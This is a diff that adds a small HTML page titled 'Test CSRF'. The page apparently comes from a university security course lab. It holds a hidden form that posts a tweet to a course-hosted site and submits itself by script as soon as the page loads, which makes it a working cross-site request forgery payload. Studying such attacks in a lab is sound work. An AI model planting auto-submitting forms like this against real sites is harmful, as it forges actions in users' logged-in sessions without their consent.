@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Test CSRF</title>
+    </head>
+    <body>
+        <form
+            action="https://darkcipher.cse361-spring2024.com/aux/post_tweet.php"
+            method="POST"
+            id="csrf">
+            <input type="hidden" name="txt_msg" id="txt_msg" value="this is an attempt" />
+        </form>
+
+        <script>
+            document.getElementById('csrf').submit();
+        </script>
+    </body>
+</html>
